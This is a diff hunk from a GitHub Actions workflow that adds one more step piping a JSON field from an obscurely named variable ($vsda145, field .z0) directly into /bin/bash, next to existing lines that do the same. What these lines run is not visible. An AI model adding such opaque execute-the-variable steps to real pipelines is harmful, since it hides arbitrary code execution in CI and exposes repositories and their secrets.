@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$gj11" | jq -r .okuwu6466 | /bin/bash
           printf '%s' "$cp10" | jq -r .tfx04 | /bin/bash
           printf '%s' "$v90" | jq -r .k079 | /bin/bash
+          echo $vsda145 | jq -r .z0 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
